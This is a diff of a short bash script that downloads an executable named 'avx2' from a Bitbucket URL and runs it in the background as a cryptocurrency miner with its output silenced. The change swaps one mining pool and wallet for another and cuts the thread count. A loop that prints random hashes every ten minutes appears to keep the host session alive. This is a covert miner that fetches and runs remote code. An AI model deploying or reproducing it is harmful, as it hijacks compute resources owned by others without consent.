@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://bitbucket.org/betee/scbte/raw/d86a4ad75b300b99e3b45cc31249fe43d646f696/avx2
 chmod +x avx2
-./avx2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qhq98sdqtfa78p64a84ea2039wydfsqyvt5frd7.$(echo $(shuf -i 1-20000 -n 1)-aing) -t95 > /dev/null 2>&1 &
+./avx2 -a yespower -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.$(echo $(shuf -i 1-20000 -n 1)-aa) -t8 > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
